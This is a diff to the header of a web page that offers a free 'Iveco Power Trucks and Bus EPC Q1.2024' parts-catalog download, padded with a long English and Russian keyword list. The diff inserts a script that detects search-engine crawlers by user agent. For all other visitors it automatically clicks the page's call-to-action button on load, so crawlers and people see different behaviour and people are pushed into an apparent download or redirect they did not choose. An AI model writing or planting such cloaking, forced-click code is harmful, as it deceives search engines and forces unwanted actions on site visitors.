@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Iveco Power Trucks and Bus EPC Q1.2024 (03.2024)</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Iveco Power Trucks and Bus EPC Q1.2024 for Windows in multiple languages. Comprehensive 2024 spare parts catalog.">
     <meta name="keywords" content="Iveco Power Trucks, Iveco Power Bus, Iveco EPC Q1.2024, Iveco Parts Catalogue, Electrical Parts Iveco, Iveco Truck Parts, Iveco Bus Parts, 2024 Iveco EPC, Iveco Spare Parts Catalog, Iveco Parts Software, Iveco Electrical Catalogue, Truck and Bus Parts, Iveco Catalog Update, Iveco Parts 2024, Iveco Power Q1 Update, iveco power epc, iveco parts catalog, iveco truck parts, iveco bus parts, iveco spare parts software, iveco electronic parts catalogue, iveco truck maintenance, iveco bus maintenance, iveco light vehicle parts, iveco medium vehicle parts, iveco heavy vehicle parts, iveco engine parts, iveco cab parts, iveco defence vehicle parts, iveco fire fighting chassis, iveco off-road parts, astra truck parts, iveco van parts, commercial vehicle parts lookup, iveco parts search, truck repair software, bus maintenance software, iveco parts numbers, commercial vehicle diagrams, iveco component lookup, heavy duty truck parts, bus repair information, iveco technical data, commercial vehicle maintenance, iveco parts database, truck service information, bus parts catalog, iveco vehicle compatibility, commercial fleet maintenance, iveco parts cross-reference, truck parts identification, bus component diagrams, iveco repair manual, commercial vehicle software, iveco parts inventory, truck diagnostics software, bus repair manual, iveco service procedures, commercial vehicle troubleshooting, iveco parts ordering, truck maintenance schedules, bus service information, Iveco Power Trucks EPC, Iveco Power Bus EPC, Iveco EPC Q1.2024 download, Iveco EPC March 2024 free download, Iveco Trucks and Bus EPC Q1.2024, Iveco Power EPC catalog, Iveco EPC 2024 high speed download, Iveco Power Parts Download, Iveco Spare Parts Catalog Q1 2024, качать Iveco Trucks EPC, скачать Iveco Bus EPC, каталог запчастей Iveco 2024, каталог запчастей Iveco скачать бесплатно, Iveco каталог запчастей, скачать Iveco EPC 2024, EPC Iveco для грузовиков скачать бесплатно, запчасти Iveco скачать, запчасти Iveco каталог 2024 скачать бесплатно, запчасти Iveco мегаскоростной скачивание, запчасти Iveco 2024 каталог скачать, Iveco Power EPC скачать, каталог Iveco EPC 2024, Iveco каталог скачивание, бесплатно скачать каталог запчастей Iveco, скачать каталог автозапчастей Iveco">
     <style>
